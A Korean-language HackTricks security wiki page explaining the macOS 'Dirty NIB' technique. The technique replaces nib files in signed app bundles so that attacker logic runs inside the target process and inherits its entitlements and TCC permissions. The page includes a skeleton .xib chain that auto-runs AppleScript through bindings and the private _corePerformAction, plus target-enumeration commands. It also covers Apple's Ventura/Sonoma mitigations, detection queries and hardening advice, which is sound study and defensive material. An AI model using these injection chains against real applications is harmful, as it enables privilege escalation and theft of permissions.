# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB는 서명된 macOS 앱 bundle 내부의 Interface Builder 파일(.xib/.nib)을 악용하여 대상 process 내부에서 공격자가 제어하는 logic을 실행하고, 이를 통해 대상 process의 entitlements와 TCC permissions을 상속하는 기법입니다. 이 기법은 처음 xpn (MDSec)이 문서화했으며, 이후 Sector7이 일반화하고 크게 확장했습니다. Sector7은 macOS 13 Ventura 및 macOS 14 Sonoma에 적용된 Apple의 완화 조치도 다루었습니다.<sup>[1][2]</sup> 배경 정보와 심층 분석은 마지막의 references를 참조하세요.

> TL;DR
> • macOS 13 Ventura 이전: bundle의 MainMenu.nib(또는 startup 시 로드되는 다른 nib)를 교체하면 안정적으로 process injection을 수행할 수 있었고, privilege escalation으로 이어지는 경우가 많았습니다.
> • macOS 13 (Ventura) 이후 및 macOS 14 (Sonoma)에서 개선됨: 최초 실행 시의 deep verification, bundle protection, Launch Constraints, 그리고 새로운 TCC “App Management” permission으로 인해 서로 관련 없는 앱이 launch 후 nib를 변조하는 것이 대부분 차단됩니다. 하지만 특정 상황에서는 여전히 공격이 가능할 수 있습니다(예: 동일한 developer의 tooling이 자체 앱을 수정하는 경우 또는 사용자가 App Management/Full Disk Access를 부여한 terminal).


## What are NIB/XIB files

Nib(NeXT Interface Builder의 약어) 파일은 AppKit 앱에서 사용하는 직렬화된 UI object graph입니다. 최신 Xcode는 편집 가능한 XML .xib 파일을 저장하며, build 시점에 이를 .nib로 compile합니다. 일반적인 앱은 `NSApplicationMain()`을 통해 main UI를 로드하며, 이 함수는 앱의 Info.plist에서 `NSMainNibFile` key를 읽고 runtime에 object graph를 instantiate합니다.

공격을 가능하게 하는 핵심 사항:
- NIB loading은 임의의 Objective-C classes를 instantiate하며, 해당 classes가 NSSecureCoding을 준수할 필요가 없습니다(Apple의 nib loader는 `initWithCoder:`를 사용할 수 없을 때 `init`/`initWithFrame:`으로 fallback합니다).
- Cocoa Bindings는 nib가 instantiate되는 과정에서 methods를 호출하도록 악용할 수 있으며, user interaction이 필요 없는 chained calls도 포함할 수 있습니다.


## Dirty NIB injection process (attacker view)

Ventura 이전의 classic flow:
1) 악성 .xib 생성
- `NSAppleScript` object(또는 `NSTask`와 같은 다른 “gadget” classes)를 추가합니다.
- payload가 포함된 title을 가진 `NSTextField`를 추가합니다(예: AppleScript 또는 command arguments).
- bindings를 통해 target object의 methods를 호출하도록 연결된 하나 이상의 `NSMenuItem` objects를 추가합니다.

2) user clicks 없이 자동 trigger
- bindings를 사용하여 menu item의 target/selector를 설정한 다음 private `_corePerformAction` method를 invoke하여 nib가 로드될 때 action이 자동으로 실행되도록 합니다. 이를 통해 user가 button을 클릭할 필요가 없어집니다.

.xib 내부의 auto-trigger chain에 대한 최소 예제(명확성을 위해 축약됨):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
이는 nib 로드 시 대상 프로세스에서 임의의 AppleScript 실행을 가능하게 합니다.<sup>[1]</sup> 고급 chain은 다음을 수행할 수 있습니다:
- 임의의 AppKit 클래스(예: `NSTask`)를 인스턴스화하고 `-launch`와 같은 인자 없는 메서드를 호출합니다.
- 위의 binding trick을 사용하여 object 인자로 임의의 selector를 호출합니다.
- AppleScriptObjC.framework를 로드하여 Objective-C로 bridge하고, 선택된 C API까지 호출합니다.
- Python.framework가 아직 포함된 구형 시스템에서는 Python으로 bridge한 다음 `ctypes`를 사용하여 임의의 C 함수를 호출합니다(Sector7의 research).<sup>[2]</sup>

3) 앱의 nib 교체
- target.app을 쓰기 가능한 위치에 복사하고, 예를 들어 `Contents/Resources/MainMenu.nib`를 malicious nib로 교체한 후 target.app을 실행합니다. Ventura 이전에는 최초 한 번 Gatekeeper assessment가 수행된 후, 이후 실행에서는 피상적인 signature check만 수행했으므로 `.nib`와 같은 non-executable resource는 다시 검증되지 않았습니다.

visible test를 위한 AppleScript payload 예시:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Modern macOS protections (Ventura/Monterey/Sonoma/Sequoia)

Apple은 modern macOS에서 Dirty NIB의 활용 가능성을 크게 줄이는 여러 systemic mitigation을 도입했습니다:<sup>[2]</sup>
- First‑launch deep verification 및 bundle protection (macOS 13 Ventura)
- 모든 앱을 처음 실행할 때(quarantined 여부와 관계없이) deep signature check가 모든 bundle resources를 검사합니다. 이후 bundle은 protected 상태가 됩니다. 동일한 developer가 만든 앱(또는 앱이 명시적으로 허용한 앱)만 해당 contents를 수정할 수 있습니다. 다른 앱이 다른 앱의 bundle에 write하려면 새로운 TCC “App Management” permission이 필요합니다.
- Launch Constraints (macOS 13 Ventura)
- System/Apple-bundled apps는 다른 위치로 복사한 뒤 실행할 수 없습니다. 따라서 OS apps에 대해 “copy to /tmp, patch, run” 접근 방식은 더 이상 사용할 수 없습니다.
- macOS 14 Sonoma의 개선 사항
- Apple은 App Management를 강화하고 Sector7이 언급한 알려진 bypasses(예: CVE‑2023‑40450)를 수정했습니다. Python.framework는 이전에(macOS 12.3) 제거되어 일부 privilege-escalation chain이 작동하지 않게 되었습니다.
- Gatekeeper/Quarantine changes
- 이 technique에 영향을 준 Gatekeeper, provenance 및 assessment changes에 대한 자세한 내용은 아래에서 참조하는 page를 확인하세요.

> Practical implication
> • Ventura+에서는 일반적으로 process에 App Management가 없거나 target과 동일한 Team ID로 signed되지 않은 경우(예: developer tooling), third‑party app의 .nib를 수정할 수 없습니다.
> • Shells/terminals에 App Management 또는 Full Disk Access를 부여하면 해당 terminal의 context 내부에서 code를 execute할 수 있는 모든 대상에 대해 이 attack surface가 사실상 다시 열립니다.


### Addressing Launch Constraints

Launch Constraints는 Ventura부터 많은 Apple apps를 non‑default location에서 실행하지 못하도록 차단합니다. Apple app을 temporary directory에 복사하고 `MainMenu.nib`를 수정한 뒤 실행하는 등 pre‑Ventura workflow에 의존하고 있었다면, >= 13.0에서 실패할 것으로 예상해야 합니다.


## Enumerating targets and nibs (useful for research / legacy systems)

- UI가 nib 기반인 apps를 찾습니다:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- bundle 내부에서 후보 nib 리소스를 찾습니다:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- 코드 서명을 철저히 검증합니다(resources를 변조한 후 다시 서명하지 않았다면 실패합니다):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> 참고: 최신 macOS에서는 적절한 authorization 없이 다른 app의 bundle에 쓰려고 하면 bundle protection/TCC에 의해 차단됩니다.


## Detection 및 DFIR 팁

- bundle resources의 File integrity monitoring
- 설치된 app의 `Contents/Resources/*.nib` 및 기타 non-executable resources에 대한 mtime/ctime 변경을 감시합니다.
- Unified logs 및 process behavior
- GUI apps 내부에서 예상치 못한 AppleScript 실행이 발생하는지, 그리고 AppleScriptObjC 또는 Python.framework를 load하는 processes를 모니터링합니다. 예:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proactive assessments
- resources가 계속 무결한 상태인지 확인하기 위해 중요한 apps 전체에서 주기적으로 `codesign --verify --deep`를 실행합니다.
- Privilege context
- TCC의 “App Management” 또는 Full Disk Access 권한을 가진 주체가 누구인지, 무엇인지 감사하세요(특히 terminals 및 management agents). 범용 shells에서 이러한 권한을 제거하면 Dirty NIB 방식의 tampering을 손쉽게 다시 활성화하는 것을 방지할 수 있습니다.


## Defensive hardening (developers 및 defenders)

- Programmatic UI를 선호하거나 nibs에서 instantiate되는 항목을 제한하세요. 강력한 classes(예: `NSTask`)를 nib graphs에 포함하지 말고, 임의의 objects에서 selectors를 간접적으로 호출하는 bindings를 피하세요.
- Library Validation이 적용된 hardened runtime을 도입하세요(최신 apps에서는 이미 표준입니다). 이것만으로 nib injection을 차단할 수는 없지만, 손쉬운 native code loading을 차단하고 attackers가 scripting-only payloads를 사용하도록 강제합니다.
- 범용 tools에서 광범위한 App Management permissions을 요청하거나 이에 의존하지 마세요. MDM에 App Management가 필요한 경우 해당 context를 user-driven shells와 분리하세요.
- App bundle의 integrity를 정기적으로 검증하고 update mechanisms가 bundle resources를 자동으로 복구하도록 하세요.


## HackTricks의 관련 문서

이 technique에 영향을 미치는 Gatekeeper, quarantine 및 provenance 변경 사항을 자세히 알아보세요:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- [1] [xpn – DirtyNIB (Pages example이 포함된 original write-up)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
